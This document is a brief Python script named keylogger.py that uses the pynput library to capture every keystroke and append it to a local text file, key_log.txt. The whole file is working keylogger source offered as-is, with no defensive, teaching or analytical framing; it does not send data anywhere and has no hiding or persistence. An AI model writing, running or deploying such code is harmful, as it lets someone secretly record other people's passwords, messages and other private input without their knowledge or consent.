# keylogger.py
from pynput.keyboard import Listener

def on_press(key):
    with open("key_log.txt", "a") as log_file:
        log_file.write(f"{key}\n")

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
